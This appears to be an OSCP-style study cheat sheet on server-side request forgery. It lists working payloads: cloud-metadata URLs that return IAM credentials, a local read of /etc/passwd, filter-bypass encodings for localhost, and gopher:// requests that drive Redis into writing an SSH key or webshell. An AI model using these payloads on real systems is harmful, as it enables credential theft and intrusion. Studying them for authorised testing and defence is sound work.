# 💥 Server-Side Request Forgery (SSRF)

> A parameter makes the **server** fetch a URL you control (`?url=`, `?next=`, webhooks, "import from URL", link previews, PDF/screenshot generators). You use the server as a proxy to reach **internal-only services**, **cloud metadata**, and **localhost admin panels** — turning "fetch a URL" into recon, credential theft, and sometimes RCE.

Related: [[Web Exploitation]] · [[HTTP]] · [[RFI]] · [[Redis]] · [[Credential Attacks]]

---

## 🧠 A "FETCH A URL" FEATURE → THINK
- **Point it inward:** `http://127.0.0.1/`, `http://localhost:PORT/`, internal IPs.
- **Cloud box?** → hit the **metadata endpoint** for creds (`169.254.169.254`).
- **Internal port scan** via response/timing differences.
- **Reach non-HTTP services** with `gopher://`/`file://` (e.g., unauth [[Redis]] → RCE).
- Confirm blind SSRF with an **OOB callback** to your box.

## ⚡ DETECTION
Make the server request your box:
```bash
python3 -m http.server 80
```
```
http://$IP/fetch?url=http://10.10.14.5/probe
```
**Look for:** a hit in your web log = the server made the request (SSRF confirmed). Then pivot inward.

## 📖 WHAT / WHY
- **What:** server fetches an attacker-supplied URL/host.
- **Why it works:** the request originates from inside the network with the server's trust/IP — bypassing firewalls and reaching localhost/internal hosts.
- **Impact ladder:** internal recon → read internal apps → cloud metadata creds → interact with internal services (`gopher`) → occasionally RCE.

## 🎯 HIGH-VALUE INTERNAL TARGETS
| Target | Payload | Prize |
|---|---|---|
| Localhost admin | `http://127.0.0.1:8080/` , `http://localhost/admin` | hidden panels |
| Internal port scan | `http://127.0.0.1:PORT/` (vary PORT) | open services (diff response/time) |
| AWS metadata | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | IAM keys |
| GCP metadata | `http://169.254.169.254/computeMetadata/v1/` (needs `Metadata-Flavor: Google`) | tokens |
| Redis (unauth) | `gopher://127.0.0.1:6379/_<cmds>` | write SSH key/webshell → [[Redis]] |
| Files | `file:///etc/passwd` | local file read |

## 🧗 FILTER / SSRF BYPASS TABLE
| Blocked | Bypass |
|---|---|
| `127.0.0.1`/`localhost` string | `127.1`, `0.0.0.0`, `[::1]`, `2130706433` (decimal), `0x7f000001` (hex), `127.0.0.1.nip.io` |
| Only `http(s)` allowed | still fine for metadata/localhost; else try `//` protocol-relative |
| Whitelist of a domain | `http://allowed.com@127.0.0.1`, `http://127.0.0.1#allowed.com`, DNS rebinding |
| Blocks internal IPs | decimal/hex/IPv6 encodings above; redirect via your server (302 → internal) |
| Scheme filtered | `gopher://`, `dict://`, `file://` (if supported) |

## 💥 EXPLOITATION EXAMPLES
**Cloud creds (AWS):**
```
http://$IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
```
http://$IP/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```
→ AccessKey/Secret/Token → use with `aws` CLI ([[Credential Attacks]]).
**Redis → RCE (gopher):** craft a `gopher://127.0.0.1:6379/_` payload that runs `CONFIG SET dir` + `SET` + `SAVE` to write an SSH key or webshell — details in [[Redis]].
**Internal app read:** `?url=http://127.0.0.1:8080/` to reach a dev/admin service not exposed externally.

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Callback to your box | SSRF confirmed | pivot to internal targets | recon |
| Metadata responds | Cloud creds | pull IAM creds → `aws` CLI | cloud access |
| Internal port responds | Hidden service | fetch it / attack it | new surface |
| Redis reachable | gopher → RCE | write SSH key/webshell → [[Redis]] | shell |
| Only HTTP GET | Limited | still enough for metadata/localhost | data/creds |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Internal IPs blocked | Encodings (decimal/hex/IPv6), `@`/`#` tricks, redirect via your server |
| Only whitelisted domain | `user@`/`#` bypass, subdomain tricks, DNS rebinding |
| No response body (blind) | Use timing for port scan; OOB callback to confirm |
| Scheme restricted | Try `gopher`/`dict`/`file`; if only http, target metadata/localhost |
| Metadata not present | Not a cloud box — focus on localhost/internal services |
| Can't turn into shell | SSRF often yields creds/recon, not RCE — reuse creds elsewhere |

## 🧹 POST-EXPLOITATION
Cloud creds → enumerate the account; internal creds/services → reuse ([[Credential Attacks]]); gopher→Redis → shell → [[Shells]].

## ⚠️ COMMON MISTAKES
- Only trying `127.0.0.1` literally — **use encodings** when filtered.
- Forgetting **cloud metadata** on cloud-hosted targets.
- Not attempting **gopher→internal service** (Redis/memcached) for RCE.
- Treating SSRF as low-value — it frequently yields **credentials**.

## 🧭 OSCP EXAM MINDSET
SSRF turns the server into your internal scanner and proxy. Confirm it fetches your URL, then reach what you otherwise can't: localhost admin panels, internal ports, and (on cloud) metadata creds. It rarely hands you a shell directly, but the creds and internal access it exposes lead there — feed everything into the reuse matrix.

## ✅ DON'T MISS
- [ ] Confirm with an OOB callback
- [ ] `127.0.0.1` + internal IPs (with encodings)
- [ ] Cloud metadata `169.254.169.254`
- [ ] Internal port scan via SSRF
- [ ] `gopher://` to internal services (Redis → [[Redis]])
- [ ] Reuse any creds found

## 📇 CHEAT SHEET
```
?url=http://10.10.14.5/probe                                   # confirm (watch your log)
```
```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
```
?url=http://127.0.0.1:8080/        ?url=http://2130706433/      # localhost + decimal bypass
```
```
?url=file:///etc/passwd            ?url=gopher://127.0.0.1:6379/_...
```
**Kill shots:** SSRF → cloud metadata creds · gopher → Redis → SSH key → shell.
